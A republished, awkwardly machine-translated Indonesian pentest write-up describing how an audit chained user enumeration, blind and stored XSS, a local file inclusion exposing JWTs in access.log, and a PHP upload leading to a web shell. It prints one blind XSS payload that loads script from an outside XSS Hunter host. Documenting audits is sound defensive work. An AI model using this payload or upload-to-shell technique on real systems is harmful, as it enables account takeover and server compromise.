<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ğŸ™…ğŸ¿ ğŸ¤¶ğŸ» ğŸ³ Dari pengguna biasa ke administrator server lengkap (XSS, LFI, Web-Shell) ğŸ––ğŸ¿ â˜‚ï¸ ğŸ™ï¸</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Pada awal tahun, seorang karyawan dari satu perusahaan menulis kepada saya. Seperti yang saya pahami, ada konflik kecil di perusahaan. Karena itu ada ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Dari pengguna biasa ke administrator server lengkap (XSS, LFI, Web-Shell)</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/452854/"><img src="https://habrastorage.org/webt/pc/sr/se/pcsrseauno875cmhmbms8odj33e.jpeg"><br><br>  Pada awal tahun, seorang karyawan dari satu perusahaan menulis kepada saya.  Seperti yang saya pahami, ada konflik kecil di perusahaan.  Karena itu ada risiko kompromi sistem oleh beberapa karyawan.  Keputusan untuk mengaudit sistem jelas merupakan keputusan yang tepat.  Lagi pula, hasil pemeriksaan itu mengejutkan saya, dan "tidak menyenangkan" mengejutkan pelanggan. <br><a name="habracut"></a><br>  Arsitektur sistem pada prinsipnya adalah standar.  Itu didasarkan pada layanan otentikasi.  Lebih lanjut, menurut token yang dikeluarkan oleh jwt, pengguna dapat menggunakan fungsionalitas sistem pada berbagai subdomain. <br><br>  Pengujian terbatas pada satu subdomain.  Namun yang paling mendasar menurut pelanggan.  Saya tidak akan menceritakan secara detail semua kesalahan dan masalah.  Mereka banyak ditemukan.  Saya hanya akan menggambarkan yang menurut saya paling penasaran. <br><br><h2>  Redundansi informasi saat mencari pengguna </h2><br>  Permintaan pencarian untuk pengguna diizinkan untuk menerima serangkaian informasi dengan sifat berikut - userID, Nama, Login, avatar ... <br><img src="https://habrastorage.org/webt/tg/qu/ov/tgquov-poitm1ptfpu0zbeluz80.png"><br>  Tanpa masalah, dimungkinkan untuk mengumpulkan seluruh basis data pengguna Login_name.  Tidak ada batasan khusus dalam fungsi login juga.  Kemudian dimungkinkan untuk memilih kata sandi di beberapa aliran atau melakukan phishing titik pada pengguna sistem yang paling penting. <br><br><h2>  Buta XSS dalam meminta dukungan pengguna. </h2><br>  Saya mendapat kesan bahwa masalah ini hadir di 90% dari sistem yang saya temui.  Sebelumnya, "tersentak" dari platform untuk mengumpulkan ulasan telah berulang kali terbang ke saya.  Akses ke sistem pemantauan perilaku pengguna di Internet juga masuk.  Ada banyak hal.  Namun, sedikit orang yang mengerti betapa berbahayanya ini.  Secara khusus, kerentanan ini ditulis di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">sini</a> . <br>  Dalam hal ini, saya memastikan bahwa serangan itu bekerja secara tidak sengaja ketika saya menerima pemberitahuan dari <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">XSS Hunter</a> .  Vektor serangan adalah sebagai berikut: <br><br><pre><code class="javascript hljs"><span class="hljs-string"><span class="hljs-string">"&gt;&lt;script src=https://sa.xss.ht&gt;&lt;/script&gt;</span></span></code> </pre> <br>  Tetapi pelanggan tidak percaya bahwa saya bisa mengendalikan panel admin melalui vektor serangan ini.  Bagaimanapun, semua informasi berharga disimpan dalam penyimpanan lokal.  Karena XSS Hunter tidak mendukung penerimaan informasi penyimpanan lokal, saya harus menggunakan XSS logger saya sendiri.  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Publikasi</a> berikut <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">ini</a> sangat membantu.  Sebagai hasil dari serangan berulang, itu mungkin untuk memverifikasi bahwa token administrator dapat dengan mudah diperoleh dengan cara jahat bahkan dari penyimpanan lokal. <br><img src="https://habrastorage.org/webt/ju/o_/gg/juo_ggzcuntv-w0xpqj8wyrc81s.png"><br><br>  Nah, kalau begitu dengan hak administrator dalam sistem, Anda bisa melakukan apa saja. <br><br><h2>  Menyimpan XSS dalam email. </h2><br>  Fungsionalitas ditemukan dalam sistem yang memungkinkan Anda membuat undangan email berbingkai untuk mendaftarkan pengguna baru.  Anda dapat memasukkan nama orang tersebut dalam formulir surat.  Untuk menjadikan email lebih pribadi.  Akibatnya, semua konten tidak luput dan jatuh ke dalam surat.  Untuk melakukan serangan xss sukses serupa melalui surat, Anda harus mengetahui klien email korban, dan Anda perlu tahu xss hari nol untuk klien ini.  Secara umum, keberhasilan serangan ini, menurut definisi, dapat diabaikan.  Hingga saat ketika saya menemukan tombol penasaran di sudut atas surat itu. <br><br><img src="https://habrastorage.org/webt/_9/bc/aw/_9bcawpodb6qbagj8om9k7d0nhc.png"><br><br>  Itu adalah kesempatan untuk membuka versi web surat itu.  Dan di sini kejutan menunggu saya.  XSS saya berfungsi.  Pada saat yang sama, versi web surat itu dibuka di admin. *. Subdomain Com <br><br><img src="https://habrastorage.org/webt/rk/nt/gt/rkntgtsisw3mf4oef6dfzc31tbq.png"><br><br>  Kejutan ganda jadi untuk berbicara. <br><br><h2>  File access.log tersedia </h2><br>  Dalam proses audit, saya menemukan tempat yang menarik.  Ketika karakter yang berbeda masuk ke permintaan, 404 tiba sebagai respons dari server, tetapi secara berkala, respons 404 sedikit berbeda dari yang sebelumnya.  Terkadang ada tajuk ekstra.  Terkadang tidak.  Mutasi tertentu dalam respons sistem mendorong saya untuk memeriksa penyertaan file lokal ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">LFI</a> ) di tempat ini.  Saya mengatur kamus lfi dan menunggu sistem mengembalikan jawaban atas semua permintaan saya.  Alhasil, ketika melihat hasil tes, saya sangat terkejut dengan jawaban dengan status 200 dengan ukuran data transmisi yang sangat berat. <br><br><img src="https://habrastorage.org/webt/kl/vc/cw/klvccwx_esjpgpgzbian0kyxd4c.png"><br><br>  Ternyata saya menemukan file access.log yang dapat dibaca.  File ini mencatat semua aktivitas di server.  Termasuk dalam file ini dimungkinkan untuk mendeteksi token pengguna jwt. <br><img src="https://habrastorage.org/webt/ld/wy/rs/ldwyrs3tnisd5_jm4sbmcx2dmom.png"><br><br>  Waktu kedaluwarsa dari token ini cukup besar.  Dan itu juga tidak terlalu baik. <br><br><h2>  Akses web-shell penuh ke server </h2><br>  Pada prinsipnya, semua hal di atas adalah masalah umum.  Tetapi jenis kerentanan tertentu sudah sulit dipenuhi.  Ini tentang akses ke server melalui kode yang dimuat dengan rapi di file shell.php.  Setelah semua proyek yang terletak di server ini dikompromikan.  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" class="user_link">Bo0oM</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">menulis</a> tentang masalah ini pada 2016 di blog-nya. <br>  Tapi kembali ke contoh saya.  Sistem memiliki kemampuan untuk membuat publikasi.  Pada saat yang sama, dimungkinkan untuk mengunggah gambar untuk publikasi.  Gambar disimpan di domain yang sama.  Namun nama file diubah secara paksa.  Yaitu Anda unggah - mypicture.jpg.  Tetapi sebagai hasilnya, Anda mendapatkan 12345.jpg.  Saya memutuskan untuk memeriksa apa yang akan terjadi jika saya mentransfer file xml (pada waktu itu saya tampaknya bermimpi bertemu dengan XXE).  Dan yang mengejutkan saya, saya mendapat jawaban 123556.xml.  Dan kemudian saya menyadari bahwa ada 99% peluang sukses dengan ekstensi file php untuk shell web.  Untuk serangan ini, saya menggunakan <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">shell b374k</a> .  Dengan akses langsung ke file - saya mendapatkan apa yang saya inginkan.  Akses ke direktori server. <br><br><img src="https://habrastorage.org/webt/bt/ik/lf/btiklfakt0wb2gyiwahanzp6k1k.png"><br><br>  Tapi itu bukan hal yang paling menyedihkan.  Yang paling menyedihkan adalah melalui kerentanan ini dimungkinkan untuk mengkompromikan lebih dari 10 proyek yang ada di direktori root server ini. <br><br><img src="https://habrastorage.org/webt/o6/tw/cw/o6twcw5jb6vfazbvbhn3lzqivdg.png"><br><br>  Teman saya <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" class="user_link">cyberpunkyc</a> mengatakan bahwa ini dapat dilihat pada tahun 2007-2010.  Sayangnya, di halaman 2019. Masalah serupa ada sampai hari ini. <br><br>  Sebagai hasil pengujian, pelanggan sangat terkejut dengan hasilnya.  Dan saya sangat senang bahwa saya sangat berguna dalam pengujian.  Jika Anda memiliki saran dengan proyek yang menarik - jangan ragu untuk menulis kepada saya di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">telegram</a> ;) </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/id452854/">https://habr.com/ru/post/id452854/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id452844/index.html">Transformasi atau kata-kata kotor: cara "mendigitalkan" operator telekomunikasi</a></li>
<li><a href="../id452846/index.html">Bagaimana kami membangun cluster PostgreSQL yang andal di Patroni</a></li>
<li><a href="../id452848/index.html">Apa yang akan terjadi pada 1 Februari 2020?</a></li>
<li><a href="../id452850/index.html">Sistem di dalam kartrid: bagaimana insinyur memperluas kemampuan konsol game</a></li>
<li><a href="../id452852/index.html">Pekerjaan jarak jauh: mitos di malam hari</a></li>
<li><a href="../id452856/index.html">Mengapa proyek indie tidak bisa dirilis?</a></li>
<li><a href="../id452872/index.html">Karena saya tidak mempersiapkan dan mengadakan seminar Rosnanov tentang FPGA di Moskow. Berencana untuk melakukan hal yang sama di Las Vegas dan Zelenograd</a></li>
<li><a href="../id452876/index.html">UICollectionViewLayout untuk pizza dari belahan yang berbeda</a></li>
<li><a href="../id452880/index.html">Kebocoran data pengguna sensasional untuk Januari - April 2019</a></li>
<li><a href="../id452882/index.html">Kesalahan Pelanggan pada Kontak Pertama dengan Freelancer</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>